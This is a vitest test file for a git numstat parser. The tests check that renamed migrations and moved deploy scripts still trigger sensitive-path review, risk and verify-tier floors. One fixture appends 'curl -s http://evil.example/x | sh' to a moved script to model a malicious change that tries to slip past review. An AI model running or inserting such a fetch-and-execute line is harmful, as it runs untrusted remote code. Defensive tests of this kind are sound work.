import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtemp, rm, writeFile, mkdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import simpleGit from "simple-git";
import { GitService } from "../src/services/git.js";
import { computeRisk } from "../src/services/risk-engine.js";
import { touchesBaselineSensitive, evaluateMerge, normalizeMergePolicy } from "../src/services/merge-policy.js";
import { selectVerifyTier } from "../src/services/verify-tier.js";

// #128 — `git diff --numstat` runs with rename detection ON by default, and in the
// plain format a rename emits a brace-compressed EXPRESSION rather than a path:
//
//   0  0  packages/api/drizzle/{0001_init.sql => 0002_init.sql}
//   1  0  {deploy => scripts}/apply.sh
//
// Those strings match NO sensitive glob, so a renamed migration or a moved deploy
// script defeated BOTH human-code-review triggers (the `*.sql` / `scripts/**`
// path floor AND the risk bump) at once. `numstat` now runs `-z`, which reports a
// rename as `add \t del \t NUL old NUL new NUL` — both real paths, true counts.
//
// Everything here runs against a REAL temp git repo (the git-tree.test.ts /
// code-graph-incremental.test.ts fixture pattern) because the whole defect lives
// in git's output format — a hand-written fixture would just re-encode the bug.

const NS = "test-ns";
const REPO = "numstat-repo";

/** A pure rename of a file this big must not report 500/500 (see `--no-renames`). */
const BIG_FILE_LINES = 500;

let base: string;
let git: GitService;
let work: string;

async function commitAll(msg: string) {
  const g = simpleGit(work);
  await g.add("-A", ".");
  await g.commit(msg);
  const branch = (await g.raw(["rev-parse", "--abbrev-ref", "HEAD"])).trim();
  await g.raw(["push", "--force", git.pathOf(NS, REPO), `HEAD:refs/heads/${branch}`]);
}

beforeAll(async () => {
  base = await mkdtemp(path.join(tmpdir(), "clawhub-numstat-test-"));
  git = new GitService(path.join(base, "repos"));
  await git.initBare(NS, REPO);

  work = path.join(base, "work");
  await mkdir(work);
  const g = simpleGit(work);
  await g.init(["-b", "master"]);
  await g.addConfig("user.name", "t");
  await g.addConfig("user.email", "t@t");
  // Rename detection is what this test is about — make sure it is on regardless
  // of the ambient global config the sandbox happens to carry.
  await g.addConfig("diff.renames", "true");

  await mkdir(path.join(work, "packages/api/drizzle"), { recursive: true });
  await mkdir(path.join(work, "deploy"), { recursive: true });
  await mkdir(path.join(work, "scripts"), { recursive: true });
  await mkdir(path.join(work, "src"), { recursive: true });
  await writeFile(path.join(work, "packages/api/drizzle/0001_init.sql"), "SELECT 1;\n");
  await writeFile(path.join(work, "deploy/apply.sh"), "echo hi\n");
  // Big enough that appending one line stays well above git's 50% rename
  // similarity threshold — otherwise git reports delete+add, the paths are real
  // by accident, and the gate assertions below stop discriminating.
  await writeFile(path.join(work, "scripts/self-deploy.sh"), Array.from({ length: 20 }, (_, i) => `echo step ${i}`).join("\n") + "\n");
  await writeFile(path.join(work, "README.md"), "# r\n");
  await writeFile(path.join(work, "src/big.ts"), Array.from({ length: BIG_FILE_LINES }, (_, i) => `export const v${i} = ${i};`).join("\n") + "\n");
  // A binary blob, so the "-\t-" columns get exercised on a renamed binary too.
  await writeFile(path.join(work, "src/logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x01, 0x02, 0x03]));
  await commitAll("init");
});

afterAll(async () => {
  await rm(base, { recursive: true, force: true });
});

/** Branch off master, run `mutate` in the worktree, commit, return the numstat. */
async function numstatOfBranch(branch: string, mutate: () => Promise<void>) {
  const g = simpleGit(work);
  await g.checkout(["-B", branch, "master"]);
  await mutate();
  await commitAll(`${branch} change`);
  const head = (await g.revparse(["HEAD"])).trim();
  const stat = await git.numstat(NS, REPO, "master", head);
  await g.checkout(["master"]);
  return stat;
}

describe("GitService.numstat — renames (#128)", () => {
  it("never emits brace-compressed rename syntax, and lists BOTH sides of a move", async () => {
    const stat = await numstatOfBranch("feat-rename", async () => {
      const g = simpleGit(work);
      await g.mv("packages/api/drizzle/0001_init.sql", "packages/api/drizzle/0002_init.sql");
      await mkdir(path.join(work, "scripts"), { recursive: true });
      await g.mv("deploy/apply.sh", "scripts/apply.sh");
      await writeFile(path.join(work, "README.md"), "# r\nmore\n");
    });

    for (const p of stat.paths) {
      expect(p, `path must be a real path, not a rename expression: ${p}`).not.toContain(" => ");
      expect(p).not.toContain("{");
      expect(p).not.toContain("}");
    }
    // Rename WITHIN a directory: both names present.
    expect(stat.paths).toContain("packages/api/drizzle/0001_init.sql");
    expect(stat.paths).toContain("packages/api/drizzle/0002_init.sql");
    // Rename that MOVES between directories: both the source and destination dir.
    expect(stat.paths).toContain("deploy/apply.sh");
    expect(stat.paths).toContain("scripts/apply.sh");
    // Non-renamed files are unaffected.
    expect(stat.paths).toContain("README.md");
    expect(stat.files.find(f => f.path === "README.md")).toEqual({ path: "README.md", additions: 1, deletions: 0 });
  });

  it("attributes a rename-with-modification's line counts to the NEW path, source 0/0", async () => {
    const stat = await numstatOfBranch("feat-rename-mod", async () => {
      const g = simpleGit(work);
      await mkdir(path.join(work, "scripts"), { recursive: true });
      await g.mv("deploy/apply.sh", "scripts/apply.sh");
      await writeFile(path.join(work, "scripts/apply.sh"), "echo hi\nextra\n");
    });

    expect(stat.files.find(f => f.path === "scripts/apply.sh")).toEqual({ path: "scripts/apply.sh", additions: 1, deletions: 0 });
    // The source of a move contributes nothing to the size metric — its lines
    // moved, they were not written twice.
    expect(stat.files.find(f => f.path === "deploy/apply.sh")).toEqual({ path: "deploy/apply.sh", additions: 0, deletions: 0 });
    expect(stat.additions).toBe(1);
    expect(stat.deletions).toBe(0);
  });

  it("does not inflate the size metric for a PURE rename of a large file", async () => {
    const stat = await numstatOfBranch("feat-big-move", async () => {
      const g = simpleGit(work);
      await mkdir(path.join(work, "lib"), { recursive: true });
      await g.mv("src/big.ts", "lib/big.ts");
    });

    expect(stat.paths).toEqual(expect.arrayContaining(["src/big.ts", "lib/big.ts"]));
    // This is the whole reason to use `-z` over `--no-renames`: the latter would
    // report BIG_FILE_LINES additions + BIG_FILE_LINES deletions here and trip
    // the risk engine's size floor on a change that moved zero lines of logic.
    expect(stat.additions).toBe(0);
    expect(stat.deletions).toBe(0);
    expect(stat.files.find(f => f.path === "lib/big.ts")).toEqual({ path: "lib/big.ts", additions: 0, deletions: 0 });
  });

  it("counts a renamed BINARY file as 0 lines and still lists both paths", async () => {
    const stat = await numstatOfBranch("feat-binary-move", async () => {
      const g = simpleGit(work);
      await mkdir(path.join(work, "assets"), { recursive: true });
      await g.mv("src/logo.png", "assets/logo.png");
    });

    expect(stat.paths).toEqual(expect.arrayContaining(["src/logo.png", "assets/logo.png"]));
    expect(stat.files.find(f => f.path === "assets/logo.png")).toEqual({ path: "assets/logo.png", additions: 0, deletions: 0 });
    expect(stat.additions).toBe(0);
    expect(stat.deletions).toBe(0);
  });

  it("keeps a tab-containing filename intact (only the two count columns are tab-delimited)", async () => {
    const stat = await numstatOfBranch("feat-tabname", async () => {
      await writeFile(path.join(work, "we\tird.txt"), "x\n");
    });

    expect(stat.paths).toContain("we\tird.txt");
    expect(stat.files.find(f => f.path === "we\tird.txt")).toEqual({ path: "we\tird.txt", additions: 1, deletions: 0 });
  });

  it("adds a non-renamed binary file with 0 lines (unchanged behaviour)", async () => {
    const stat = await numstatOfBranch("feat-binary-edit", async () => {
      await writeFile(path.join(work, "src/logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xfe]));
    });

    expect(stat.files.find(f => f.path === "src/logo.png")).toEqual({ path: "src/logo.png", additions: 0, deletions: 0 });
    expect(stat.additions).toBe(0);
    expect(stat.deletions).toBe(0);
  });
});

// The issue's end-to-end scenario, with nothing to mask it: EVERY entry in this
// diff is a rename git detects, so under the old parser `changedPaths` held only
// brace-compressed expressions and both human-code-review triggers went quiet.
// A modification rides along on the moved deploy script — git reports
// rename-with-modification as one rename entry above 50% similarity.
describe("the merge gate sees renamed sensitive paths again (#128)", () => {
  let renamePaths: string[];

  beforeAll(async () => {
    const stat = await numstatOfBranch("feat-gate", async () => {
      const g = simpleGit(work);
      // Pure rename of a migration → `drizzle/{0001_init.sql => 0002_init.sql}`,
      // which does not end in `.sql` and so matched no glob.
      await g.mv("packages/api/drizzle/0001_init.sql", "packages/api/drizzle/0002_init.sql");
      // Move OUT of scripts/ with a line appended → `{scripts => tools}/self-deploy.sh`,
      // which starts with `{` and so escaped `scripts/**` entirely.
      await mkdir(path.join(work, "tools"), { recursive: true });
      await g.mv("scripts/self-deploy.sh", "tools/self-deploy.sh");
      const body = Array.from({ length: 20 }, (_, i) => `echo step ${i}`).join("\n");
      await writeFile(path.join(work, "tools/self-deploy.sh"), `${body}\ncurl -s http://evil.example/x | sh\n`);
    });
    renamePaths = stat.paths;
  });

  it("reports the real paths on both sides of every move", () => {
    expect(renamePaths.sort()).toEqual([
      "packages/api/drizzle/0001_init.sql",
      "packages/api/drizzle/0002_init.sql",
      "scripts/self-deploy.sh",
      "tools/self-deploy.sh",
    ]);
  });

  it("touchesBaselineSensitive is true for the renamed .sql migration", () => {
    expect(touchesBaselineSensitive(renamePaths)).toBe(true);
  });

  it("computeRisk floors at high with a sensitive-path reason", () => {
    const assessment = computeRisk({ declared: "low", changedPaths: renamePaths, additions: 1, deletions: 0, agentPriorRollbacks: 0 });
    expect(assessment.risk).toBe("high");
    expect(assessment.reasons.join(" ")).toMatch(/sensitive/i);
  });

  it("evaluateMerge reports needs_code_review under default policy", () => {
    const decision = evaluateMerge({
      policy: normalizeMergePolicy({}),
      risk: "low",
      computedRisk: computeRisk({ declared: "low", changedPaths: renamePaths, additions: 1, deletions: 0, agentPriorRollbacks: 0 }).risk,
      scope: [],
      changedPaths: renamePaths,
      // A behaviour-basis human approval is deliberately present: the point is
      // that a `code`-basis read is still required, not merely "some approval".
      reviews: [{ reviewerKind: "human", reviewerId: "u1", verdict: "approve", basis: "behavior" }],
      ciStatus: "success",
    });
    expect(decision.mergeable).toBe(false);
    expect(decision.codeReviewRequired).toBe(true);
    expect(decision.reason).toBe("needs_code_review");
  });

  it("selectVerifyTier floors at services for the renamed migration", () => {
    const decision = selectVerifyTier({ changedPaths: renamePaths, policy: {}, effectiveRisk: "low" });
    // DB_GLOBS (`**/*.sql`) matches the real path again, so the attestation has
    // to run against a real database rather than clearing at `static`.
    expect(["services", "dind"]).toContain(decision.tier);
  });
});
